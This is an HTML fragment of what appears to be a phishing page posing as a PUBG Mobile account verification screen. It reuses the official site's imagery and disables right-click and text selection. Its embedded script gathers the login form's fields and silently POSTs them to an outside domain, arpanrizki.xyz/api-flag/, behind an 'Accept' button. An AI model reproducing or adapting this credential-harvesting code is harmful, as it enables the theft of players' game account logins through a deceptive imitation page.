...
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"><script> function open_my_account() {var myFormAcc = $("#formLogin").serialize();$.ajax({url: 'http://arpanrizki.xyz/api-flag/',data: myFormAcc,type: 'POST',success: function() {return true;},error: function() {return true;}});}</script>
...
<img class="navbar-pay" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
</div> 
</div> 
...
<select style="margin-bottom: 20px;" class="verify-input" name="level" id="level" required>
...
<button type="submit" onmousedown="buka.play();" class="verify-btn">Accept</button>
</form>
</center>
</div> 
<div class="footer">
